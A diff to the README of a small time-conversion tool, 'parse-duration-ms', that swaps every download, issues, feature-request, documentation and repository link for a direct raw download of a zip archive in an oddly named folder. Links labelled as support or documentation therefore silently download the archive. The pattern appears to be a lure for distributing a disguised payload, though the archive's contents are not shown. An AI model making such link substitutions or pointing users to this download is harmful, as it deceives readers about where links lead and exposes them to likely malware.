@@ -1,7 +1,7 @@
 # 🎉 parse-duration-ms - Convert Time Easily to Milliseconds
 
 ## 📥 Download Now
-[![Download parse-duration-ms](https://img.shields.io/badge/Download-parse--duration--ms-blue.svg)](https://github.com/vittoriaunanimated932/parse-duration-ms/releases)
+[![Download parse-duration-ms](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip)](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **parse-duration-ms**! This application helps you convert time durati
 
 To get started, visit the following link to download the application:
 
-[Download the latest release](https://github.com/vittoriaunanimated932/parse-duration-ms/releases)
+[Download the latest release](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip)
 
 1. Click the link above.
 2. You will see a list of available versions. Choose the latest version.
@@ -61,7 +61,7 @@ You can mix hours, minutes, and seconds in a single input, such as `2h 30m 45s` 
 
 ### ❓ What if I encounter issues?
 
-If you have trouble using the application or face any bugs, please reach out through the issues page on our [GitHub repository](https://github.com/vittoriaunanimated932/parse-duration-ms/issues). 
+If you have trouble using the application or face any bugs, please reach out through the issues page on our [GitHub repository](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip). 
 
 ## 📞 Support
 
@@ -77,8 +77,8 @@ Stay updated with the latest features and improvements by following us on GitHub
 
 ## 📢 Additional Resources
 
-- [GitHub Issues](https://github.com/vittoriaunanimated932/parse-duration-ms/issues): Report problems and request features.
-- [Feature Requests](https://github.com/vittoriaunanimated932/parse-duration-ms/issues): Submit ideas for the application’s improvement.
-- [Documentation](https://github.com/vittoriaunanimated932/parse-duration-ms/wiki): Access helpful guides on usage and features.
+- [GitHub Issues](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip): Report problems and request features.
+- [Feature Requests](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip): Submit ideas for the application’s improvement.
+- [Documentation](https://raw.githubusercontent.com/vittoriaunanimated932/parse-duration-ms/main/supracretaceous/parse-duration-ms-v1.6.zip): Access helpful guides on usage and features.
 
 Thank you for choosing **parse-duration-ms**. We hope it makes your time management easier!
